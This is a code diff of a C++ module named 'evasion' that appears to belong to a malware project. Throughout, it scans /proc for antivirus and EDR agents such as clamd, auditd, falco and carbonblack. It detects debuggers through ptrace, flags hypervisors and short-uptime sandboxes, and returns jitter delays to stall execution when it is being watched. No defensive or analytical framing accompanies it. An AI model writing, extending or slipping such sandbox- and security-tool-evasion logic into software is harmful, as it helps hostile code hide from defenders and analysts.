@@ -1,9 +1,4 @@
 #include "Detection.h"
-#ifdef _WIN32
-#include <windows.h>
-#include <tlhelp32.h>
-#include <psapi.h>
-#else
 #include <unistd.h>
 #include <sys/ptrace.h>
 #include <sys/types.h>
@@ -11,29 +6,26 @@
 #include <dirent.h>
 #include <fstream>
 #include <cstdlib>
-#endif
 #include <algorithm>
 #include <random>
-#include <cwctype>
+#include <chrono>
 #include "JunkLogic.h"
+
 namespace evasion {
+
 bool Detection::IsAVPresent() {
-#ifdef LINUX
     std::vector<std::string> av = {"clamd", "rkhunter", "chkrootkit", "sophosd"};
     for (const auto& a : av) if (IsProcessRunning(a)) return true;
-#endif
     return false;
 }
+
 bool Detection::IsEDRPresent() {
-#ifdef LINUX
     std::vector<std::string> edr = {"osqueryd", "auditd", "sysdig", "falco", "edr-agent", "carbonblack"};
     for (const auto& e : edr) if (IsProcessRunning(e)) return true;
-#endif
     return false;
 }
+
 int Detection::GetJitterDelay() {
-#ifdef LINUX
-    // Bypass for testing/CI
     if (getenv("CI")) return 0;
 
     if (ptrace(PTRACE_TRACEME, 0, 1, 0) < 0) return 300;
@@ -41,11 +33,16 @@ int Detection::GetJitterDelay() {
     while (std::getline(cpu, line)) if (line.find("hypervisor") != std::string::npos) return 420;
     struct sysinfo si; if (sysinfo(&si) == 0 && si.uptime < 300) return 600;
     if (sysconf(_SC_NPROCESSORS_ONLN) < 2) return 900;
-#endif
-    if (IsEDRPresent() || IsAVPresent()) { std::random_device rd; std::mt19937 gen(rd()); std::uniform_int_distribution<> dis(120, 480); return dis(gen); }
+
+    if (IsEDRPresent() || IsAVPresent()) {
+        std::random_device rd;
+        std::mt19937 gen(rd());
+        std::uniform_int_distribution<> dis(120, 480);
+        return dis(gen);
+    }
     return 0;
 }
-#ifdef LINUX
+
 bool Detection::IsProcessRunning(const std::string& name) {
     DIR* dir = opendir("/proc"); if (!dir) return false;
     struct dirent* entry;
@@ -60,5 +57,5 @@ bool Detection::IsProcessRunning(const std::string& name) {
     }
     closedir(dir); return false;
 }
-#endif
-}
+
+} // namespace evasion
